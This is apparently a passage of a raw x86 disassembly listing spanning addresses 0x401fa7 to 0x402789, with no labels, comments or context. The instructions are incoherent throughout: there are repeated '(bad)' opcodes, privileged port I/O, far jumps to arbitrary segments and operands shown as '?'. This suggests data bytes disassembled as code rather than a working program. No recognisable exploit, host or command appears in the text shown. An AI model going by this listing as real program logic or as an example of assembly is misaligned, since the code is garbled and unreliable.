  401fa7:	push   cs
  401fa8:	cwde   
  401fa9:	dec    BYTE PTR [edx+0x1ee2786]
  401faf:	out    dx,eax
  401fb0:	dec    esp
  401fb1:	jle    0x401fce
  401fb3:	jecxz  0x402004
  401fb5:	cwde   
  401fb6:	jo     0x401f79
  401fb8:	fidivr WORD PTR [edx+eiz*2]
  401fbb:	dec    esp
  401fbc:	lahf   
  401fbd:	or     eax,DWORD PTR [eax+0x24]
  401fc0:	pop    esp
  401fc1:	sbb    bh,BYTE PTR [ecx-0x7c]
  401fc4:	mov    eax,0xbee0735f
  401fc9:	loopne 0x401ff5
  401fcb:	(bad)  
  401fcc:	sub    ebx,DWORD PTR [eax+0x1435c9ad]
  401fd2:	lods   al,BYTE PTR ds:[esi]
  401fd3:	out    0x94,eax
  401fd5:	ror    BYTE PTR [esi+0x552ed5e8],cl
  401fdb:	in     eax,0x2d
  401fdd:	xor    eax,0xa3b9917a
  401fe2:	mov    ch,0x7e
  401fe4:	arpl   WORD PTR [ecx],di
  401fe6:	and    eax,0xbb955c1c
  401feb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401fec:	dec    eax
  401fed:	inc    ebp
  401fee:	adc    DWORD PTR ds:0xb0f77f8c,0x7f
  401ff5:	cli    
  401ff6:	sub    al,0x1
  401ff8:	leave  
  401ff9:	in     eax,dx
  401ffa:	sbb    eax,0xb4ed1355
  401fff:	dec    eax
  402000:	repnz pop eax
  402002:	or     al,BYTE PTR ds:0x4b5114c9
  402008:	out    0xef,al
  40200a:	(bad)  
  40200c:	dec    esi
  40200d:	hlt    
  40200e:	mov    bh,0xd9
  402010:	jo     0x401fd1
  402012:	jecxz  0x401fa4
  402014:	icebp  
  402015:	jl     0x402018
  402017:	ret    
  402018:	idiv   BYTE PTR [edx-0x4c3306de]
  40201e:	scas   al,BYTE PTR es:[edi]
  40201f:	mul    bh
  402021:	dec    edi
  402022:	out    dx,eax
  402023:	in     eax,dx
  402024:	(bad)  
  402025:	jmp    0x9fb8:0xc644ca3a
  40202c:	adc    esp,DWORD PTR [esp+eiz*4-0x7e]
  402030:	mov    WORD PTR [edi+0x25],ds
  402033:	sub    ah,BYTE PTR [ecx+0x5d]
  402036:	sbb    eax,0x80c1a846
  40203b:	aaa    
  40203c:	mov    bl,0x3d
  40203e:	xchg   edi,eax
  40203f:	sub    DWORD PTR [edi-0xd],0xffffffcc
  402043:	pop    eax
  402044:	mov    dl,0xf4
  402046:	jae    0x4020b6
  402048:	scas   eax,DWORD PTR es:[edi]
  402049:	inc    ecx
  40204a:	inc    esp
  40204b:	pop    eax
  40204c:	scas   eax,DWORD PTR es:[edi]
  40204d:	and    al,BYTE PTR [eax+0x2437e694]
  402053:	push   ebx
  402054:	lock shl ebx,0xba
  402058:	xchg   eax,edx
  40205a:	fist   WORD PTR [eax-0x6687b384]
  402060:	int3   
  402061:	push   eax
  402062:	xor    DWORD PTR [ebx+eiz*1-0x541aaf0a],esp
  402069:	stc    
  40206a:	jb     0x40206d
  40206c:	cmp    BYTE PTR [edi-0x80],dl
  40206f:	add    ecx,DWORD PTR [eax+0x27]
  402072:	push   0x11
  402074:	mov    edx,0x9751aee
  402079:	data16 add al,0xc3
  40207c:	push   es
  40207d:	inc    esp
  40207e:	adc    edi,edi
  402080:	ja     0x4020a9
  402082:	clc    
  402083:	cmp    cl,0x8e
  402086:	xchg   edi,eax
  402087:	dec    edi
  402088:	and    eax,0x2c326d52
  40208e:	sub    DWORD PTR [edi-0x33],esi
  402091:	jl     0x4020c7
  402093:	cmp    esp,0x4eb6c27c
  402099:	fstp   TBYTE PTR [ecx-0x76]
  40209c:	retf   0xd62b
  40209f:	jns    0x4020ca
  4020a1:	push   eax
  4020a2:	stc    
  4020a3:	ror    ecx,0xfa
  4020a6:	dec    edi
  4020a7:	adc    ecx,0x6
  4020aa:	push   ecx
  4020ab:	shl    DWORD PTR [ecx+eiz*1+0x29],0x96
  4020b0:	or     DWORD PTR [esi+0x45],ebp
  4020b3:	outs   dx,DWORD PTR ds:[esi]
  4020b4:	jbe    0x402084
  4020b6:	cwde   
  4020b7:	data16 (bad) 
  4020ba:	(bad)  
  4020bb:	pop    eax
  4020bc:	stc    
  4020bd:	arpl   di,bp
  4020bf:	imul   esp,ebx,0x3cd4ee26
  4020c5:	xchg   ebx,eax
  4020c6:	jl     0x4020b7
  4020c8:	rol    esi,0x71
  4020cb:	dec    ebx
  4020cc:	mov    es:0x3dc0d89b,al
  4020d2:	clc    
  4020d3:	add    al,0x45
  4020d5:	push   esp
  4020d6:	mov    esi,0x57d4882f
  4020db:	jg     0x402145
  4020dd:	leave  
  4020de:	mov    ebx,DWORD PTR [ebp-0x5d50cd20]
  4020e4:	xchg   esi,eax
  4020e5:	cmc    
  4020e6:	cmpps  xmm7,XMMWORD PTR [esi+0x4a],0x89
  4020eb:	test   DWORD PTR [ecx-0x13],esi
  4020ee:	int    0x77
  4020f0:	push   es
  4020f1:	ja     0x4020b2
  4020f3:	add    eax,0xc1d01645
  4020f8:	cdq    
  4020f9:	(bad)  
  4020fa:	sbb    cl,BYTE PTR [eax]
  4020fc:	shr    BYTE PTR ds:0x526c7379,0xea
  402103:	add    al,BYTE PTR [edx+0x1b]
  402106:	jl     0x402149
  402108:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402109:	gs sub dl,dh
  40210c:	mov    edi,0xe96dcb21
  402111:	jl     0x4020b7
  402113:	jp     0x402161
  402115:	imul   esp,edi,0xbd7cdfb0
  40211b:	fsubr  QWORD PTR [edi+0x52be6ead]
  402121:	jp     0x402128
  402123:	sbb    eax,0x7b26c873
  402128:	fwait
  402129:	xor    DWORD PTR [eax+ebx*2-0x7f1f6f0],eax
  402130:	or     ebp,ebx
  402132:	retf   
  402133:	push   ds
  402134:	xor    eax,0x1c354c27
  402139:	dec    esp
  40213a:	aad    0x76
  40213c:	retf   0x8ce
  40213f:	cdq    
  402140:	mov    esi,0x33722a70
  402145:	call   0x7044:0x5dd59603
  40214c:	fcmovbe st,st(4)
  40214e:	sbb    eax,ebx
  402150:	and    BYTE PTR [ecx+eiz*8+0x0],al
  402154:	int    0x8c
  402156:	adc    ebx,edx
  402158:	rcl    BYTE PTR [ebx-0x532324d7],cl
  40215e:	mov    al,0x31
  402160:	sub    al,0x77
  402162:	mov    dl,0xdf
  402164:	outs   dx,BYTE PTR ds:[esi]
  402165:	sbb    DWORD PTR [ebp+ecx*8-0x2],ebx
  402169:	es sbb ebp,eax
  40216c:	jmp    0xec55:0x8d8a728f
  402173:	repnz mov al,ds:0xb7124b74
  402179:	rcl    bl,cl
  40217b:	adc    eax,0xe048e512
  402180:	ss push 0x4a
  402183:	sti    
  402184:	clc    
  402185:	pop    eax
  402186:	or     al,0xa7
  402188:	loop   0x402193
  40218a:	mov    edi,0xd6b914de
  40218f:	cmp    DWORD PTR [edx],edi
  402191:	sti    
  402192:	or     al,0x5d
  402194:	sbb    al,bh
  402196:	xor    al,0xc0
  402198:	ret    
  402199:	jg     0x40219f
  40219b:	xor    BYTE PTR [ebx-0x42c784cf],ch
  4021a1:	jae    0x4021d2
  4021a3:	dec    ebx
  4021a4:	ja     0x4021aa
  4021a6:	test   eax,0x176628b7
  4021ab:	or     al,0x19
  4021ad:	and    DWORD PTR [edi-0x383ba0f0],0xffffffdc
  4021b4:	push   ebp
  4021b5:	test   eax,0xe0812ba4
  4021ba:	and    al,0x8c
  4021bc:	sub    DWORD PTR [edi-0x96b00d2],0x3585082a
  4021c6:	repnz clc 
  4021c8:	jno    0x402247
  4021ca:	in     al,dx
  4021cb:	jne    0x402240
  4021cd:	pop    edx
  4021ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4021cf:	shr    BYTE PTR [eax+eax*2],0x1d
  4021d3:	popf   
  4021d4:	adc    DWORD PTR [ebx+edi*8+0x1e8a2875],eax
  4021db:	or     al,0xac
  4021dd:	repz sbb dh,cl
  4021e0:	jle    0x402167
  4021e2:	xchg   DWORD PTR [eax+0x3e55eca9],eax
  4021e8:	add    eax,0xffc25192
  4021ed:	xchg   ebp,eax
  4021ee:	lea    ecx,[esi+edx*2-0x72]
  4021f2:	add    DWORD PTR [ebx-0x80],edx
  4021f5:	pop    eax
  4021f6:	mov    ah,0xa6
  4021f8:	fwait
  4021f9:	sbb    bh,BYTE PTR [eax+0x78]
  4021fc:	xor    ch,BYTE PTR [esi+eiz*1]
  4021ff:	mov    cl,BYTE PTR fs:[ecx+0x3f]
  402203:	shr    DWORD PTR ss:[edx],0xa5
  402207:	xchg   edi,eax
  402208:	cmp    ah,bl
  40220a:	gs dec ebx
  40220c:	fs and al,0x1e
  40220f:	jecxz  0x4021cd
  402211:	or     BYTE PTR [edx-0x4f],bl
  402214:	mov    dh,0xa1
  402216:	and    DWORD PTR [ebp-0x376e6aa3],ebp
  40221c:	fisttp DWORD PTR [eax-0x74eeae3a]
  402222:	inc    ebp
  402223:	push   ss
  402224:	cdq    
  402225:	iret   
  402226:	jecxz  0x40224f
  402228:	xchg   edx,eax
  402229:	mov    ch,0x2c
  40222b:	bound  esp,QWORD PTR [esp+ebp*4+0x59]
  40222f:	cli    
  402230:	fisttp WORD PTR [eax]
  402232:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402233:	cwde   
  402234:	daa    
  402235:	cmp    ebp,DWORD PTR fs:[esi]
  402238:	es jle 0x402227
  40223b:	xchg   esi,eax
  40223c:	push   edi
  40223d:	cmp    al,0x58
  40223f:	add    cl,dh
  402241:	sub    DWORD PTR [edx],edx
  402243:	aad    0x5e
  402245:	jmp    0x40223b
  402247:	pop    ebp
  402248:	clc    
  402249:	push   edx
  40224a:	sar    BYTE PTR [eax],1
  40224c:	cmp    edx,DWORD PTR [esi-0x424b8eaa]
  402252:	push   edi
  402253:	mov    al,0xa7
  402255:	fs jns 0x402260
  402258:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402259:	jo     0x402226
  40225b:	xor    BYTE PTR [ebx-0x515c3f44],bh
  402261:	imul   ebx,DWORD PTR [edx+0x55ef55fb],0x5e
  402268:	(bad)
  40226b:	inc    esi
  40226c:	je     0x402290
  40226e:	push   es
  40226f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402270:	jl     0x4022c8
  402272:	out    0x61,eax
  402274:	or     DWORD PTR [edx],ebx
  402276:	lds    ebp,FWORD PTR [edx]
  402278:	sbb    esp,edx
  40227a:	add    DWORD PTR [edi+eax*1],esi
  40227d:	adc    ecx,ecx
  40227f:	test   DWORD PTR [edx+0x18e46112],ecx
  402285:	mov    ebx,ecx
  402287:	popf   
  402288:	and    bl,BYTE PTR [ebp+0x2b0d3343]
  40228e:	jno    0x4022f2
  402290:	les    esp,FWORD PTR [edi]
  402292:	add    ch,bh
  402294:	inc    esp
  402295:	call   0x7ffed35e
  40229a:	xchg   ecx,eax
  40229b:	clc    
  40229c:	xchg   esi,eax
  40229d:	call   0x29fa:0xf2782f90
  4022a4:	push   ebp
  4022a5:	inc    eax
  4022a6:	jb     0x4022d8
  4022a8:	xor    DWORD PTR cs:[ebp-0x7b7725f7],esp
  4022af:	fcomp  DWORD PTR [edi-0x45]
  4022b2:	and    BYTE PTR [edi+0x6cf18e34],cl
  4022b8:	ins    BYTE PTR es:[edi],dx
  4022b9:	pop    ebp
  4022ba:	cmp    dl,dh
  4022bc:	fistp  QWORD PTR [eax]
  4022be:	pop    edx
  4022c0:	hlt    
  4022c1:	mul    DWORD PTR [ecx]
  4022c3:	inc    ecx
  4022c4:	sbb    eax,0x169ac25a
  4022c9:	aas    
  4022ca:	push   ebx
  4022cb:	sub    ah,BYTE PTR [ecx+0x6]
  4022ce:	shl    DWORD PTR [edx],0xfc
  4022d1:	test   bh,dh
  4022d3:	outs   dx,BYTE PTR ds:[esi]
  4022d4:	and    bl,BYTE PTR [ebx-0x6e704a93]
  4022da:	pop    edi
  4022db:	cwde   
  4022dc:	xchg   esi,eax
  4022dd:	cmp    bh,BYTE PTR [edx-0x7f2a5e29]
  4022e3:	dec    esp
  4022e4:	or     bh,BYTE PTR [eax+0xd]
  4022e7:	adc    DWORD PTR [esi],ebp
  4022e9:	fsubrp st(6),st
  4022eb:	inc    edi
  4022ec:	(bad)  
  4022ee:	sub    al,BYTE PTR ss:[esp+edx*2-0x4]
  4022f3:	push   ds
  4022f4:	test   al,0xd8
  4022f6:	sub    al,0xd7
  4022f8:	test   eax,0x20f0e148
  4022fd:	cmp    al,0xa0
  4022ff:	aas    
  402300:	ss or  eax,0xae6e858e
  402306:	push   ecx
  402307:	rcr    BYTE PTR [ecx+0x4cd16819],1
  40230d:	lea    ecx,[bx+si-0x2d]
  402311:	mov    ebx,DWORD PTR [ecx+0x6586e87c]
  402317:	aaa    
  402318:	retf   
  402319:	pop    ds
  40231a:	pusha  
  40231b:	xor    ah,al
  40231d:	sti    
  40231e:	js     0x402378
  402320:	mov    ds:0x3eb60b21,al
  402325:	xor    DWORD PTR [ebp+0x35],ebx
  402328:	aad    0x8e
  40232a:	and    BYTE PTR [esp+ebx*4+0x32b54555],dl
  402331:	dec    ebp
  402332:	or     bl,cl
  402334:	mov    ds:0xfb46925e,al
  402339:	add    ecx,DWORD PTR [eax+0x5b]
  40233c:	int    0xa8
  40233e:	sub    ah,BYTE PTR [esi+0x51]
  402341:	mov    ch,0xce
  402343:	sbb    eax,0x859cf405
  402348:	stos   DWORD PTR es:[edi],eax
  402349:	push   ds
  40234a:	xor    al,0xc5
  40234c:	mov    esp,0xe1117590
  402351:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402352:	and    ecx,DWORD PTR [ebp+0x13]
  402355:	pop    eax
  402356:	mov    ebx,0x9d99d0f3
  40235b:	xchg   edi,eax
  40235c:	adc    bh,ch
  40235e:	test   al,0xaa
  402360:	stos   DWORD PTR es:[edi],eax
  402361:	sbb    cl,BYTE PTR [ecx]
  402363:	cdq    
  402364:	add    eax,0xad107bf2
  402369:	clc    
  40236a:	jmp    0x4022f7
  40236c:	popa   
  40236d:	pop    ebp
  40236e:	jecxz  0x4023b5
  402370:	jge    0x402382
  402372:	mov    esi,?
  402374:	fcomp  DWORD PTR [eax]
  402376:	mov    al,0x70
  402378:	loope  0x402336
  40237a:	jb     0x40238b
  40237c:	mov    edx,0xaf15cdee
  402381:	mov    dl,0xca
  402383:	frstor [ecx+ebx*2]
  402386:	mov    DWORD PTR [ecx-0x3a],ecx
  402389:	lea    edx,[esi]
  40238b:	sbb    ebx,DWORD PTR [ebx]
  40238d:	or     ebp,esi
  40238f:	jecxz  0x40234d
  402391:	inc    edx
  402392:	add    DWORD PTR [edx],ebx
  402394:	sub    BYTE PTR [ecx+0x647a9b24],dh
  40239a:	or     al,al
  40239c:	(bad)  
  40239d:	ds ins DWORD PTR es:[edi],dx
  40239f:	sbb    DWORD PTR [ebp+0x3b],ecx
  4023a2:	add    BYTE PTR [edi+0x3ee9a110],cl
  4023a8:	add    bl,bl
  4023aa:	mov    dh,0x35
  4023ac:	pop    ss
  4023ad:	mov    edi,0x3d08b811
  4023b2:	mov    cl,0xe
  4023b4:	inc    edi
  4023b5:	dec    dx
  4023b7:	push   edi
  4023b8:	lods   al,BYTE PTR ds:[esi]
  4023b9:	lods   eax,DWORD PTR ds:[esi]
  4023ba:	outs   dx,BYTE PTR ds:[esi]
  4023bb:	sbb    BYTE PTR [eax+0xa33895a],dh
  4023c1:	data16 fidiv DWORD PTR [edx+eax*1]
  4023c5:	dec    ebp
  4023c6:	sub    esi,DWORD PTR ds:0x90f0c2b5
  4023cc:	in     eax,0xf0
  4023ce:	dec    ebx
  4023cf:	retf   
  4023d0:	pop    eax
  4023d1:	sub    eax,DWORD PTR [ebx-0x78]
  4023d4:	jmp    0x64dd72fa
  4023d9:	push   esi
  4023da:	test   BYTE PTR [ecx],cl
  4023dc:	push   ebp
  4023dd:	and    BYTE PTR ds:0x5c4d8cb3,ah
  4023e3:	stos   DWORD PTR es:[edi],eax
  4023e4:	jl     0x40242f
  4023e6:	lea    ecx,[edi-0x1718fdfd]
  4023ec:	iret   
  4023ed:	mov    esp,esi
  4023ef:	dec    edi
  4023f0:	mov    ah,0xd
  4023f2:	cmc    
  4023f3:	ja     0x40240e
  4023f5:	test   DWORD PTR [edx-0x43],0x83f4bdb8
  4023fc:	adc    bl,al
  4023fe:	mov    al,ds:0x97a5c63b
  402403:	out    dx,eax
  402404:	xlat   BYTE PTR ds:[ebx]
  402405:	cmp    al,0xbd
  402407:	add    edx,ebx
  402409:	mov    cl,0x48
  40240b:	bound  ecx,QWORD PTR ds:0xbf0f6ed9
  402411:	repz and BYTE PTR [edi],cl
  402414:	mov    BYTE PTR [edx],dl
  402416:	mov    ds,esp
  402418:	mov    ds:0xf94d03d7,eax
  40241d:	(bad)  
  40241e:	gs xchg ebp,eax
  402420:	xor    bl,BYTE PTR [ebx+0x442bc8e6]
  402426:	sub    ebp,DWORD PTR [eax-0x78]
  402429:	and    al,0x3e
  40242b:	fadd   DWORD PTR [ecx+0xb]
  40242e:	sbb    bl,BYTE PTR [edi-0x25c2854f]
  402434:	lock addr16 sar dl,1
  402438:	and    ax,0x91c2
  40243c:	dec    ebp
  40243d:	jmp    0x40245b
  40243f:	ins    BYTE PTR es:[edi],dx
  402440:	add    bl,BYTE PTR [eax+0x3c469beb]
  402446:	scas   al,BYTE PTR es:[edi]
  402447:	call   FWORD PTR fs:[ecx+0xe]
  40244b:	mov    ah,0xa1
  40244d:	mov    dl,0x67
  40244f:	pop    ebp
  402450:	fmul   DWORD PTR [eax]
  402452:	cmp    al,0xeb
  402454:	pmulhw mm6,QWORD PTR [ebp+0x7b5ab328]
  40245b:	pop    es
  40245c:	ds jp  0x402445
  40245f:	arpl   WORD PTR [edx*1-0xe629b87],dx
  402466:	in     eax,0x6c
  402468:	sahf   
  402469:	add    al,0x75
  40246b:	pop    edx
  40246c:	out    0x49,al
  40246e:	inc    ebp
  40246f:	imul   edi,DWORD PTR [ebp+esi*4+0x24],0xfffffff6
  402474:	push   ds
  402475:	xor    BYTE PTR [ebp+0x76],dh
  402478:	shl    BYTE PTR [esi],1
  40247a:	ss or  eax,0x7e05d907
  402480:	mov    ah,0x60
  402482:	aam    0x3
  402484:	lods   al,BYTE PTR ds:[esi]
  402485:	push   0x3c
  402487:	xor    eax,0x9001196d
  40248c:	or     eax,DWORD PTR [edx+0x36]
  40248f:	(bad)  
  402491:	sub    BYTE PTR [ebx-0x4c6360ed],ch
  402497:	jmp    0xf371a100
  40249c:	jno    0x4024d0
  40249e:	bound  edi,QWORD PTR [esi]
  4024a0:	aam    0xd7
  4024a2:	aad    0x59
  4024a4:	jbe    0x402483
  4024a6:	mov    esp,0x483a64ef
  4024ab:	push   ds
  4024ac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4024ad:	fld    DWORD PTR [edi+0x31a3871d]
  4024b3:	(bad)  
  4024b4:	lods   eax,DWORD PTR ds:[esi]
  4024b5:	cmp    al,0x51
  4024b7:	mov    edx,0xb1e4f774
  4024bc:	lds    edi,FWORD PTR [esi]
  4024be:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4024bf:	mov    WORD PTR [edi+0xe],es
  4024c2:	jp     0x402514
  4024c4:	dec    esi
  4024c5:	xor    esp,ebx
  4024c7:	fwait
  4024c8:	in     al,dx
  4024c9:	gs dec ebp
  4024cb:	pop    edi
  4024cc:	lahf   
  4024cd:	lahf   
  4024ce:	xor    al,BYTE PTR [edi-0x1dfb9bb1]
  4024d4:	mov    ds:0xefd97632,al
  4024d9:	push   cs
  4024da:	(bad)  
  4024db:	pop    ebp
  4024dc:	ins    DWORD PTR es:[edi],dx
  4024dd:	retf   
  4024de:	inc    ebp
  4024df:	out    dx,eax
  4024e0:	jae    0x4024de
  4024e2:	pop    edx
  4024e3:	test   eax,0x18c17642
  4024e8:	push   edi
  4024e9:	mov    al,0xf9
  4024eb:	or     edi,edx
  4024ed:	push   0x27
  4024ef:	sbb    dh,BYTE PTR [edx]
  4024f1:	push   ebp
  4024f2:	mov    ch,BYTE PTR [ecx-0x32]
  4024f5:	jno    0x402501
  4024f7:	add    BYTE PTR [ebx+ecx*2],ah
  4024fa:	fidivr DWORD PTR [esi]
  4024fc:	pop    eax
  4024fd:	call   0xc02fec26
  402502:	xchg   DWORD PTR [ecx+eiz*2],edx
  402505:	jge    0x4024e8
  402507:	ss popf 
  402509:	push   ecx
  40250a:	cwde   
  40250b:	sbb    ebx,edx
  40250d:	or     eax,0x8a60bce7
  402512:	lods   al,BYTE PTR ds:[esi]
  402513:	sbb    DWORD PTR [eax],edi
  402515:	sbb    al,0x31
  402517:	mov    esp,DWORD PTR [ebp-0x7]
  40251a:	or     eax,0xd4235308
  40251f:	mov    dl,0xca
  402521:	push   esp
  402522:	dec    ebx
  402523:	mov    ebx,0x198aca27
  402528:	mov    cl,0xf6
  40252a:	dec    esp
  40252b:	aaa    
  40252c:	jo     0x402582
  40252e:	(bad)  
  40252f:	xchg   esi,eax
  402530:	pushf  
  402531:	(bad)  
  402533:	pusha  
  402534:	out    0xf0,al
  402536:	mov    ebx,DWORD PTR [ecx-0x336529c5]
  40253c:	sar    BYTE PTR [esi],1
  40253e:	call   0x1e378d28
  402543:	cmp    eax,0x2b8a4500
  402548:	shr    BYTE PTR [eax+0x26],1
  40254b:	inc    ebp
  40254c:	call   0x9684:0x7a2379c3
  402553:	xlat   BYTE PTR ds:[ebx]
  402554:	test   ax,0xe312
  402558:	mov    eax,0xe246405
  40255d:	mov    ecx,0xc844f6c1
  402562:	mov    dl,0x22
  402564:	push   es
  402565:	adc    eax,0xef74767e
  40256a:	xor    BYTE PTR [ecx+0x77],dl
  40256d:	rcr    DWORD PTR [eax-0x5f],1
  402570:	lock mov esi,DWORD PTR [ebp+0x37e4ebb3]
  402577:	push   ebp
  402578:	jmp    0x402506
  40257a:	fcmovb st,st(6)
  40257c:	jne    0x4025e4
  40257e:	pop    ss
  40257f:	aad    0x15
  402581:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402582:	mov    bh,0x56
  402584:	fwait
  402585:	inc    DWORD PTR [edi+eax*1-0x79]
  402589:	mov    cl,0xed
  40258b:	add    DWORD PTR [edx],edi
  40258d:	mov    ebp,0xe5b212a8
  402592:	cmc    
  402593:	lods   al,BYTE PTR ds:[esi]
  402594:	inc    esi
  402595:	lahf   
  402596:	not    al
  402598:	fidivr DWORD PTR [ebx-0x11b79c35]
  40259e:	sub    dh,bh
  4025a0:	fisubr DWORD PTR [edx+0x69]
  4025a3:	pop    ebp
  4025a4:	cmp    al,0x30
  4025a6:	jo     0x40260d
  4025a8:	dec    ebp
  4025a9:	fstp   TBYTE PTR [edi-0x1]
  4025ac:	add    ebx,esp
  4025ae:	test   al,0xcf
  4025b0:	sbb    DWORD PTR [eax+0x2d],0x22
  4025b4:	repz pop ds
  4025b6:	iret   
  4025b7:	test   al,0x64
  4025b9:	dec    edx
  4025ba:	shl    ecx,0x72
  4025bd:	pop    esi
  4025be:	cmp    al,0x2
  4025c0:	test   al,0xfa
  4025c2:	push   eax
  4025c3:	mov    edi,0x1e708826
  4025c8:	pop    eax
  4025c9:	xor    eax,0x4ff7122a
  4025ce:	and    edi,edx
  4025d0:	mov    dl,BYTE PTR [edx-0x30]
  4025d3:	add    al,0x45
  4025d5:	les    ecx,FWORD PTR [edx-0x4b9dd112]
  4025db:	mov    DWORD PTR [ebx-0x6490710b],ebx
  4025e1:	jne    0x4025b6
  4025e3:	ror    BYTE PTR [ebx-0x7],0xe9
  4025e7:	(bad)  
  4025e8:	push   ebx
  4025e9:	adc    ch,cl
  4025eb:	arpl   WORD PTR [eax],ax
  4025ed:	in     eax,0xbd
  4025ef:	scas   eax,DWORD PTR es:[edi]
  4025f0:	pop    edx
  4025f1:	dec    esi
  4025f2:	mov    ah,0x2f
  4025f4:	retf   0x9799
  4025f7:	test   BYTE PTR [edx-0x3e2ca66],al
  4025fd:	(bad)  
  4025fe:	shl    BYTE PTR [esi-0x32692d0],cl
  402604:	iret   
  402605:	mov    edi,0x407a2e5f
  40260a:	adc    DWORD PTR [ebp+0x21],ebp
  40260d:	jge    0x40259b
  40260f:	sub    DWORD PTR [edi-0x4afc24eb],ecx
  402615:	out    0xad,al
  402617:	mov    esi,DWORD PTR [ebx+0x3f72f84d]
  40261d:	stos   DWORD PTR es:[edi],eax
  40261e:	nop
  40261f:	or     BYTE PTR [ebx+0x27],bl
  402622:	fadd   st,st(7)
  402624:	cmp    eax,DWORD PTR [ebx+0x5e]
  402627:	cmp    eax,0xcc6bb8af
  40262c:	add    al,0xb2
  40262e:	or     ecx,ecx
  402630:	stos   BYTE PTR es:[edi],al
  402631:	add    DWORD PTR [ecx-0x2418edfe],0x31cde2a
  40263b:	imul   BYTE PTR [edx]
  40263d:	xor    DWORD PTR [esi+0x148d8142],esp
  402643:	mov    ds:0xa51e9ab2,eax
  402648:	(bad)  
  402649:	mov    al,0xd5
  40264b:	icebp  
  40264c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40264d:	pop    es
  40264e:	inc    eax
  40264f:	bound  ebx,QWORD PTR [eax]
  402651:	push   ss
  402652:	ds jb  0x402696
  402655:	jmp    0x4025f9
  402657:	(bad)
  40265a:	rcr    BYTE PTR [edi],1
  40265c:	(bad)  
  40265d:	test   bl,0x49
  402660:	in     eax,0x52
  402662:	sub    eax,0x70dddd0e
  402667:	jbe    0x402619
  402669:	stos   BYTE PTR es:[edi],al
  40266a:	test   eax,0x27fd4b4b
  40266f:	dec    ebx
  402670:	dec    esi
  402671:	in     al,dx
  402672:	repnz enter 0x337b,0x65
  402677:	xor    BYTE PTR [edi],bh
  402679:	xchg   ebp,eax
  40267a:	dec    ebp
  40267b:	fbstp  TBYTE PTR ds:0x9c32d844
  402681:	pop    eax
  402682:	push   es
  402683:	aas    
  402684:	pop    esi
  402685:	clc    
  402686:	shl    ch,cl
  402688:	inc    ebp
  402689:	push   edi
  40268a:	test   eax,0x16c405e0
  40268f:	scas   eax,DWORD PTR es:[edi]
  402690:	adc    DWORD PTR [edi+esi*1],esi
  402693:	sar    DWORD PTR [edi],0xb4
  402696:	in     al,0xc7
  402698:	fcmovnb st,st(7)
  40269a:	sar    BYTE PTR [edx],1
  40269c:	retf   
  40269d:	loopne 0x4026e0
  40269f:	or     bl,BYTE PTR [ecx+esi*4+0x5e]
  4026a3:	xor    BYTE PTR [edi+0x595cc098],0x73
  4026aa:	loopne 0x4026e8
  4026ac:	pop    eax
  4026ad:	out    dx,eax
  4026ae:	fild   QWORD PTR [ecx+0x5255efc]
  4026b4:	or     ecx,DWORD PTR [ecx+edx*4+0x4c]
  4026b8:	das    
  4026b9:	call   0x8c2b89ce
  4026be:	(bad)
  4026c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4026c2:	jle    0x402667
  4026c4:	mov    ?,WORD PTR [edi]
  4026c6:	push   esi
  4026c7:	sahf   
  4026c8:	out    dx,al
  4026c9:	adc    BYTE PTR [edi+eax*2+0x3c13487d],bh
  4026d0:	in     eax,dx
  4026d1:	or     DWORD PTR [eax-0x67ec73aa],ecx
  4026d7:	cmp    eax,0x59b19f00
  4026dc:	inc    esp
  4026dd:	repz pop edi
  4026df:	pop    edi
  4026e0:	pop    es
  4026e1:	push   edx
  4026e2:	(bad)  
  4026e3:	mov    bh,0xc1
  4026e5:	in     al,dx
  4026e6:	not    DWORD PTR [ebx-0x5179922]
  4026ec:	adc    al,0xa4
  4026ee:	adc    bh,al
  4026f0:	cld    
  4026f1:	add    eax,0xff68ddac
  4026f6:	out    dx,eax
  4026f7:	xor    al,0x62
  4026f9:	(bad)  
  4026fa:	out    0x2c,eax
  4026fc:	add    bh,bl
  4026fe:	test   al,0x9
  402700:	imul   edx,edi,0xffffffad
  402703:	popa   
  402704:	(bad)  
  402705:	pop    edx
  402706:	mov    eax,0xf6cb95ef
  40270b:	out    0xe4,al
  40270d:	jle    0x402762
  40270f:	inc    esp
  402710:	cmp    eax,0xf6747701
  402715:	push   eax
  402716:	inc    eax
  402717:	sub    DWORD PTR [edi+0x6b4459db],0x6be20d53
  402721:	les    ebp,FWORD PTR [eax]
  402723:	outs   dx,DWORD PTR ds:[esi]
  402724:	jnp    0x40273a
  402726:	mov    dl,0x4f
  402728:	inc    esi
  402729:	or     al,0x1b
  40272b:	pop    ecx
  40272c:	retf   0xee2b
  40272f:	pop    edi
  402730:	test   eax,0x98150a91
  402735:	std    
  402736:	das    
  402737:	shr    BYTE PTR [eax-0x19],cl
  40273a:	jmp    0x402715
  40273c:	je     0x4026cd
  40273e:	mov    dl,0x61
  402740:	pop    esp
  402741:	in     al,dx
  402742:	push   esp
  402743:	lock icebp 
  402745:	aam    0x7c
  402747:	pop    edx
  402748:	into   
  402749:	and    ebx,DWORD PTR [ecx]
  40274b:	fst    QWORD PTR [esi-0x338196d2]
  402751:	jecxz  0x402722
  402753:	daa    
  402754:	dec    esp
  402755:	sbb    BYTE PTR [edi+esi*2-0x41fb93dc],dh
  40275c:	sahf   
  40275d:	ret    
  40275e:	imul   ebx,DWORD PTR [edx+0x78d5bf96],0x2135fb00
  402768:	mov    cl,BYTE PTR [ebx]
  40276a:	sahf   
  40276b:	jae    0x402732
  40276d:	xor    al,0x7d
  40276f:	test   al,0xb
  402771:	fsub   DWORD PTR [ebx+0x28]
  402774:	cmp    bh,BYTE PTR [esi+0x32731bd5]
  40277a:	mov    ch,0x44
  40277c:	movs   DWORD PTR es:[di],DWORD PTR ss:[si]
  40277f:	dec    edx
  402780:	sub    DWORD PTR [edx+ebx*4],0x28
  402784:	sub    eax,0xc821d441
  402789:	pop    ebx
